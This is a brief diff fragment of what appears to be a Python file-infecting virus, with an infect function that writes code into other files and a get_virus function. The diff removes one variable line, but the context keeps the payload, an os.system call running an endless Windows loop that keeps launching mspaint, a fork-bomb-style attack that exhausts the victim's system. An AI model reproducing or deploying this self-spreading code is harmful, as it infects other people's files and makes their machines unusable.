@@ -48,7 +48,6 @@ def infect(file, virus):
             f.writelines(content)
 
 def get_virus():
-    infected = False
     virus = [
         'import os\n', "os.system('FOR /L %N IN () DO start mspaint')"]
 
